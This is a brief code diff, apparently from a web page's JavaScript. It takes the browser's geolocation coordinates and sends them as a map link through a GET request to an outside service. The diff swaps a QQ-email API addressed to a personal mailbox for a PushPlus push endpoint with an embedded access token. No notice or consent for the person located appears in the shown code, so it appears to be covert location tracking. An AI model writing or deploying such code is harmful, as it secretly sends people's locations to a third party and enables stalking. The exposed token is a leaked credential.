@@ -6,7 +6,7 @@
                     var longitude = position.coords.longitude;
                     
                     // 构建URL链接
-                    var url = "https://v.api.aa1.cn/api/qqemail/new/?to=jun.csy@qq.com&subject=2003&message=https://uri.amap.com/marker?position=";
+                    var url = "http://www.pushplus.plus/send?token=2999d55f4c3c4bfebaaa7370040881f2&title=2003&content=https://uri.amap.com/marker?position=";
                     url += longitude + "," + latitude;
 
                     // 发起GET请求
